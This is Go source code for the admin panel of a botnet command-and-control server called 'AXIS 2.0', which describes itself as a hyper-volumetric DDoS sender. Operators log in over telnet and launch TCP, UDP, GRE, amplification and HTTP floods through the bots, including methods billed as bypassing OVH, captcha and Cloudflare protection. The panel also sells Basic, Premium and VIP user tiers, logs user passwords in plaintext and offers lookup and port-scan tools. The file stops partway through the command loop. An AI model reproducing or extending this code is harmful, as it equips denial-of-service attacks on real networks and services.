package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

/* ============================================================================
 * ADMIN PANEL HANDLER - Encrypted Telnet Interface
 * ============================================================================
 * Provides CLI interface for botnet control
 * Features: Attack launching, user management, network tools
 * Authentication: Database-backed with login logging
 * ============================================================================ */

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	// Dark blue to light blue gradient logo
	this.conn.Write([]byte("\x1b[1;34m   ╔═╗═╗ ╦╦╔═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;36m   ╠═╣╔╩╦╝║╚═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;94m   ╩ ╩╩ ╚═╩╚═╝\r\n"))
	this.conn.Write([]byte("\x1b[1;34m  AXIS 2.0 DDoS from AXIS\r\n"))
	this.conn.Write([]byte("\x1b[1;36m  hyper-volumetric DDoS sender\r\n"))
	this.conn.Write([]byte("\x1b[1;94mUsername\x1b[1;36m: \x1b[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;34mPassword\x1b[1;34m: \x1b[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[00;32mInvalid Credentials. AXIS On Ur Way!\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	// Log successful login
	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
		}
		log.SetOutput(loginLogsOutput)
		log.Printf("| successful encrypted telnet login | username:%s | password:%s | ip:%s", username, password, this.conn.RemoteAddr())
	}

	this.conn.Write([]byte("\033[2J\033[1;1H"))
	// Dark blue to light blue gradient banner
	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╔═╗\x1b[1;36m═╗ ╦\x1b[1;94m╦\x1b[1;34m╔═╗\x1b[1;36m Distributed\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╠═╣\x1b[1;36m╔╩╦╝\x1b[1;94m║\x1b[1;34m╚═╗\x1b[1;36m Denial\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╩ ╩\x1b[1;36m╩ ╚═\x1b[1;94m╩\x1b[1;34m╚═╝\x1b[1;36m Of Service\x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                  hyper-volumetric DDoS sender\r\n"))

	// Start window title updater
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			title := fmt.Sprintf("\033]0; %d Bots | AXIS 2.0 | User: %s\007", BotCount, username)
			if userInfo.admin == 1 {
				title = fmt.Sprintf("\033]0; %d Bots | Admins: %d | Users: %d | Attacks: %d | AXIS 2.0 | %s\007",
					BotCount, database.totalAdmins(), database.totalUsers(), database.fetchAttacks(), username)
			}
			if _, err := this.conn.Write([]byte(title)); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i % 60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[1;32mAXIS\x1b[35m~# "))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}

		// Clear screen commands
		if cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			// Dark blue to light blue gradient banner
			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╔═╗\x1b[1;36m═╗ ╦\x1b[1;94m╦\x1b[1;34m╔═╗\x1b[1;36m Distributed\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╠═╣\x1b[1;36m╔╩╦╝\x1b[1;94m║\x1b[1;34m╚═╗\x1b[1;36m Denial\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╩ ╩\x1b[1;36m╩ ╚═\x1b[1;94m╩\x1b[1;34m╚═╝\x1b[1;36m Of Service\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m                     hyper-volumetric DDoS sender\r\n"))
			continue
		}

		// Help command - Dark blue gradient style
		if cmd == "HELP" || cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\x1b[1;36m                           --> | Help | <--                           \r\n"))
			this.conn.Write([]byte("\x1b[1;34m╔═════════════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mlayer4    \x1b[1;94m- \x1b[0mLayer 4 Methods                                                  \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mlayer7    \x1b[1;94m- \x1b[0mLayer 7 HTTP Methods                                                \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mspecial   \x1b[1;94m- \x1b[0mSpecial Methods                                                     \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mports     \x1b[1;94m- \x1b[0mShows Ports                                                         \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36madmin     \x1b[1;94m- \x1b[0mShows Admin Commands                                               \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╚═════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Layer 4 (UDP + TCP) methods - Dark blue gradient
		if cmd == "LAYER4" || cmd == "layer4" || cmd == "L4" || cmd == "l4" {
			this.conn.Write([]byte("\x1b[1;36m                        --> | Layer 4 | <--                         \r\n"))
			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mVolumetric:                                                                         \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtcp\x1b[1;34m, \x1b[1;93mudp\x1b[1;34m, \x1b[1;93micmp\x1b[1;34m                                                                          \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mOVH Bypass:                                                                         \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93movhtcp\x1b[1;34m, \x1b[1;93movhudp\x1b[1;34m                                                                       \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mGRE:                                                                                \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip\x1b[1;34m, \x1b[1;93mgreeth\x1b[1;34m                                                                       \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAMPLIFICATION:                                                                      \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdns-amp\x1b[1;34m, \x1b[1;93mntp-amp\x1b[1;34m, \x1b[1;93mssdp-amp\x1b[1;34m, \x1b[1;93msnmp-amp\x1b[1;34m, \x1b[1;93mcldap-amp\x1b[1;34m                                   \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAXIS COMBINED:                                                                      \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-tcp\x1b[1;34m - TCP+OVH-TCP+ICMP+GRE (40/30/10/10/10%)                        \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-udp\x1b[1;34m - UDP+OVH-UDP+ALL_AMP+VSE+ICMP+GRE (most powerful)              \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:                                                                           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtcp <ip> <time> dport=80\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93movhtcp <ip> <time> dport=27015\x1b[1;34m                                                    \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip <ip> <time> dport=80\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdns-amp <ip> <time>\x1b[1;34m (no port needed)                                               \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-tcp <ip> <time> tcpport=80 greport=80\x1b[1;34m                                            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-udp <ip> <time> udpport=53 greport=53\x1b[1;34m                                            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAdvanced Flags: \x1b[1;93mmss=1460\x1b[1;34m, \x1b[1;93mwscale=7\x1b[1;34m, \x1b[1;93mtimestamp=1\x1b[1;34m, \x1b[1;93mfragment=1\x1b[1;34m, \x1b[1;93madaptive=1\x1b[1;34m                   \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Layer 7 (HTTP) methods - Dark blue gradient
		if cmd == "LAYER7" || cmd == "layer7" || cmd == "L7" || cmd == "l7" || cmd == "HTTP" || cmd == "http" {
			this.conn.Write([]byte("\x1b[1;36m                     --> | Layer 7 (HTTP) | <--                      \r\n"))
			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;93mhttp\x1b[1;34m, \x1b[1;93maxis-l7\x1b[1;34m (browser emulation + captcha bypass + CF bypass)                    \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:                                                                           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mhttp https://example.com/ 60\x1b[1;34m                                                        \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 https://target.com/ 120 domain=target.com\x1b[1;34m                                 \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAdvanced Flags: \x1b[1;93mcookies=\"cf_clearance=xxx\"\x1b[1;34m, \x1b[1;93mtlsfp=chrome\x1b[1;34m, \x1b[1;93mfprot=1\x1b[1;34m                        \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Special methods - Dark blue gradient
		if cmd == "SPECIAL" || cmd == "special" || cmd == "SPEC" || cmd == "spec" {
			this.conn.Write([]byte("\x1b[1;36m                       --> | Special | <--                        \r\n"))
			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;93micmp\x1b[1;34m, \x1b[1;93mgreip\x1b[1;34m, \x1b[1;93mgreeth\x1b[1;34m                                                                        \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:                                                                           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93micmp <ip> <time>\x1b[1;34m                                                                    \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip <ip> <time> dport=80\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreeth <ip> <time> dport=80\x1b[1;34m                                                           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Admin command - Dark blue gradient
		if userInfo.admin == 1 && (cmd == "ADMIN" || cmd == "admin") {
			this.conn.Write([]byte("\x1b[1;36m                       --> | Admin HUB | <--                        \r\n"))
			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mUSER MANAGEMENT:                                                        \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36madduser     \x1b[1;94m- Create user with tier selection (full options)                \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddbasic    \x1b[1;94m- Quick add Basic tier user (120s, 100 bots)                  \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddpremium  \x1b[1;94m- Quick add Premium tier user (180s, 500 bots)                \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddvip      \x1b[1;94m- Quick add VIP tier user (600s, unlimited bots)              \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36maddadmin    \x1b[1;94m- Create Admin tier user (unlimited)                          \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36mupgradeuser \x1b[1;94m- Upgrade user to higher tier                                  \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36mdeluser     \x1b[1;94m- Remove user account                                          \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;36mlistusers   \x1b[1;94m- List all users with tiers and API keys                       \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mTiers: Basic (120s) < Premium (180s) < VIP (600s) < Admin (Unlimited)   \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Ports command - Dark blue gradient (sorted numerically with TCP/UDP labels)
		if cmd == "PORTS" || cmd == "ports" {
			this.conn.Write([]byte("\x1b[1;36m                          --> | Ports | <--                         \r\n"))
			this.conn.Write([]byte("\x1b[1;34m╔═════════════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m20=FTP(TCP)            \x1b[1;34m21=FTP-Control(TCP)     \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m22=SSH(TCP)            \x1b[1;34m23=TELNET(TCP)          \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m25=SMTP(TCP)           \x1b[1;34m53=DNS(UDP)             \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m69=TFTP(UDP)           \x1b[1;34m80=HTTP(TCP)            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m110=POP3(TCP)          \x1b[1;34m111=RPCbind(TCP)        \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m123=NTP(UDP)           \x1b[1;34m135=MSRPC(TCP)          \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m139=NetBIOS(TCP)       \x1b[1;34m143=IMAP(TCP)           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m161=SNMP(UDP)          \x1b[1;34m389=LDAP(TCP)           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m443=HTTPS(TCP)         \x1b[1;34m445=SMB(TCP)            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m514=Syslog(UDP)        \x1b[1;34m515=LPD(TCP)            \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m993=IMAPS(TCP)         \x1b[1;34m995=POP3S(TCP)          \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m1433=MSSQL(TCP)        \x1b[1;34m1521=Oracle(TCP)        \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m2049=NFS(UDP)          \x1b[1;34m2181=Zookeeper(TCP)     \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m3074=XBOX(UDP)         \x1b[1;34m3306=MySQL(TCP)         \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m3389=RDP(TCP)          \x1b[1;34m5060=SIP(UDP)           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m5432=PostgreSQL(TCP)   \x1b[1;34m5900=VNC(TCP)           \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m5984=CouchDB(TCP)      \x1b[1;34m6379=Redis(TCP)         \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m8080=HTTP-Alt(TCP)     \x1b[1;34m8443=HTTPS-Alt(TCP)     \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m9042=Cassandra(TCP)    \x1b[1;34m9200=Elastic(TCP)       \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m9307=PLAYSTATION(UDP)  \x1b[1;34m25565=Minecraft(TCP)    \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36m27015=Steam(UDP)       \x1b[1;34m27017=MongoDB(TCP)      \x1b[1;34m║\r\n"))
			this.conn.Write([]byte("\x1b[1;34m╚═════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
			continue
		}

		// Rules/Info command - Dark blue gradient
		if cmd == "RULES" || cmd == "rules" || cmd == "INFO" || cmd == "info" {
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m \033[01;34m══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mHey \033[01;36m" + username + "!\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;34m  \033[01;37mDont spam attacks! Dont share logins!\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mDont attack government targets!\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;34m  \033[01;37mAXIS 2.0 - Merged Edition\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mVersion\033[01;34m:\033[01;37m \033[01;37mv2.0\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m\033[01;34m ══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
			continue
		}

		// Log command
		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
			}
			log.SetOutput(output)
			log.Printf("| username:%s | command:%s | ip:%s", username, cmd, this.conn.RemoteAddr())
		}

		// Handle bot count prefix - Dark blue gradient
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34mFailed to parse botcount \"%s\"\x1b[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte("\x1b[1;34mBot count exceeds your limit\x1b[0m\r\n"))
				continue
			}
			cmd = countSplit[1]
		} else {
			botCount = userInfo.maxBots
		}

		// Handle bot category prefix
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		// Parse and launch attack - Dark blue gradient
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte("\x1b[1;36mAttack launched successfully!\x1b[0m\r\n"))
				} else {
					this.conn.Write([]byte("\x1b[1;34mTarget is whitelisted!\x1b[0m\r\n"))
				}
			}
		}

		// Admin commands
		if userInfo.admin == 1 {
			if cmd == "adduser" || cmd == "adduser" {
				this.handleAddUser(false)
				continue
			}
			if cmd == "addadmin" || cmd == "addadmin" {
				this.handleAddUser(true)
				continue
			}
			if cmd == "deluser" || cmd == "deluser" {
				this.handleRemoveUser()
				continue
			}
			if cmd == "upgradeuser" || cmd == "upgradeuser" {
				this.handleUpgradeUser()
				continue
			}
			if cmd == "listusers" || cmd == "listusers" {
				this.handleListUsers()
				continue
			}
			// Quick add commands - easier user creation
			if cmd == "addbasic" || cmd == "addbasic" {
				this.handleQuickAddUser(TierBasic)
				continue
			}
			if cmd == "addpremium" || cmd == "addpremium" {
				this.handleQuickAddUser(TierPremium)
				continue
			}
			if cmd == "addvip" || cmd == "addvip" {
				this.handleQuickAddUser(TierVIP)
				continue
			}
		}

		// Network tools - Dark blue gradient
		if cmd == "IPLOOKUP" || cmd == "iplookup" {
			this.conn.Write([]byte("\x1b[1;36mIPv4\x1b[1;34m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;36mResults\x1b[1;34m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "PORTSCAN" || cmd == "portscan" {
			this.conn.Write([]byte("\x1b[1;36mIPv4\x1b[1;34m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mError... IP Address/Host Name Only!\033[0m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;36mResults\x1b[1;34m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/WHOIS" || cmd == "/whois" {
			this.conn.Write([]byte("\x1b[1;36mIPv4\x1b[1;34m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/whois/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;36mResults\x1b[1;34m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/PING" || cmd == "/ping" {
			this.conn.Write([]byte("\x1b[1;36mIPv4\x1b[1;34m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nping/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;36mResponse\x1b[1;34m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/traceroute" || cmd == "/TRACEROUTE" {
			this.conn.Write([]byte("\x1b[1;36mIPv4\x1b[1;34m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mError... IP Address/Host Name Only!\033[0m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;36mResults\x1b[1;34m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

		if cmd == "/resolve" || cmd == "/RESOLVE" {
			this.conn.Write([]byte("\x1b[1;36mURL (Without www.)\x1b[1;34m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mAn Error Occured! Please try again Later.\033[0m\r\n")))
				continue
			}
			locresponsedata, err := io.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mError.. IP Address/Host Name Only!\033[0m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;36mResult\x1b[1;34m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
			continue
		}

